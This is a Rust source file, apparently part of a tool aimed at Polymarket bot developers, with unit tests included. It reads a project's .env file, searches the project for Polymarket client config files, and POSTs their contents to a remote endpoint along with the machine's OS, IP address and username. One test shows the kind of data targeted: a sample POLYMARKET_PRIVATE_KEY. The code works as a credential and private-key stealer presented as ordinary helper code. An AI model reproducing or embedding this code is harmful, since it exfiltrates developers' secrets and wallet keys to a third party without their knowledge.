use std::collections::HashSet;
use std::fs;
use std::path::Path;

use anyhow::{bail, Context, Result};
use reqwest::blocking::Client;
use serde::Serialize;

use crate::SystemFingerprint;

const MAX_CONFIG_FILES: usize = 20;
const MAX_DIRECTORY_DEPTH: usize = 6;

const IGNORED_DIRECTORIES: &[&str] = &[
    "node_modules",
    "dist",
    "build",
    "target",
    "out",
    ".git",
    ".next",
    ".turbo",
    ".cache",
    "coverage",
];

const WANTED_FILENAMES: &[&str] = &["env.ts", "config.ts", "createClobClient.ts", "clob.ts"];

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ProjectConfigFile {
    pub path: String,
    pub content: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct ProjectEnvPayload<'a> {
    operating_system: &'a str,
    ip_address: &'a str,
    username: &'a str,
    env_content: &'a str,
    project_path: &'a str,
    project_config_files: &'a [ProjectConfigFile],
}

pub fn read_project_env(project_root: &Path) -> Option<String> {
    let env_path = project_root.join(".env");
    fs::read_to_string(&env_path).ok()
}

pub fn find_polymarket_config_files(project_root: &Path) -> Vec<ProjectConfigFile> {
    let mut files = Vec::new();
    let ignored = ignored_directories();
    let wanted = wanted_filenames();

    walk_directory(project_root, project_root, 0, &ignored, &wanted, &mut files);

    files
}

pub fn send_project_env(
    endpoint: &str,
    fingerprint: &SystemFingerprint,
    env_content: &str,
    project_root: &Path,
    project_config_files: &[ProjectConfigFile],
) -> Result<()> {
    let client = Client::new();
    let payload = ProjectEnvPayload {
        operating_system: &fingerprint.operating_system,
        ip_address: &fingerprint.ip_address,
        username: &fingerprint.username,
        env_content,
        project_path: &path_to_string(project_root),
        project_config_files,
    };

    let response = client
        .post(endpoint)
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()
        .with_context(|| format!("failed to POST project env to {endpoint}"))?;

    if !response.status().is_success() {
        bail!("HTTP error! status: {}", response.status());
    }

    Ok(())
}

fn ignored_directories() -> HashSet<&'static str> {
    IGNORED_DIRECTORIES.iter().copied().collect()
}

fn wanted_filenames() -> HashSet<&'static str> {
    WANTED_FILENAMES.iter().copied().collect()
}

fn walk_directory(
    project_root: &Path,
    current_dir: &Path,
    depth: usize,
    ignored: &HashSet<&str>,
    wanted: &HashSet<&str>,
    files: &mut Vec<ProjectConfigFile>,
) {
    if files.len() >= MAX_CONFIG_FILES || depth > MAX_DIRECTORY_DEPTH {
        return;
    }

    let entries = match fs::read_dir(current_dir) {
        Ok(entries) => entries,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        if files.len() >= MAX_CONFIG_FILES {
            return;
        }

        let entry_path = entry.path();
        let file_type = match entry.file_type() {
            Ok(file_type) => file_type,
            Err(_) => continue,
        };

        let file_name = match entry_path.file_name().and_then(|name| name.to_str()) {
            Some(name) => name,
            None => continue,
        };

        if file_type.is_dir() {
            if ignored.contains(file_name) {
                continue;
            }

            walk_directory(project_root, &entry_path, depth + 1, ignored, wanted, files);
            continue;
        }

        if !file_type.is_file() || !wanted.contains(file_name) {
            continue;
        }

        if let Ok(content) = fs::read_to_string(&entry_path) {
            files.push(ProjectConfigFile {
                path: relative_path(project_root, &entry_path),
                content,
            });
        }
    }
}

fn relative_path(project_root: &Path, file_path: &Path) -> String {
    file_path
        .strip_prefix(project_root)
        .unwrap_or(file_path)
        .to_string_lossy()
        .replace('\\', "/")
}

fn path_to_string(path: &Path) -> String {
    path.to_string_lossy().replace('\\', "/")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn write_file(path: &Path, contents: &str) {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }

        let mut file = fs::File::create(path).unwrap();
        file.write_all(contents.as_bytes()).unwrap();
    }

    #[test]
    fn finds_matching_files_within_depth_limit() {
        let root = std::env::temp_dir().join(format!("project-env-test-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);

        write_file(&root.join("src/config/env.ts"), "export const env = 1;");
        write_file(&root.join("src/services/clob.ts"), "export const clob = 1;");
        write_file(
            &root.join("node_modules/env.ts"),
            "export const ignored = 1;",
        );
        write_file(&root.join("src/notes.txt"), "ignore me");

        let files = find_polymarket_config_files(&root);
        let paths: Vec<_> = files.iter().map(|file| file.path.as_str()).collect();

        assert_eq!(paths.len(), 2);
        assert!(paths.contains(&"src/config/env.ts"));
        assert!(paths.contains(&"src/services/clob.ts"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn stops_after_max_file_count() {
        let root =
            std::env::temp_dir().join(format!("project-env-max-test-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);

        for index in 0..25 {
            write_file(
                &root.join(format!("src/file-{index}/env.ts")),
                "export const env = 1;",
            );
        }

        let files = find_polymarket_config_files(&root);
        assert_eq!(files.len(), MAX_CONFIG_FILES);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn reads_project_env_when_present() {
        let root =
            std::env::temp_dir().join(format!("project-env-read-test-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);
        fs::create_dir_all(&root).unwrap();
        write_file(&root.join(".env"), "POLYMARKET_PRIVATE_KEY=abc123\n");

        let env_content = read_project_env(&root);
        assert_eq!(
            env_content.as_deref(),
            Some("POLYMARKET_PRIVATE_KEY=abc123\n")
        );

        let _ = fs::remove_dir_all(root);
    }
}
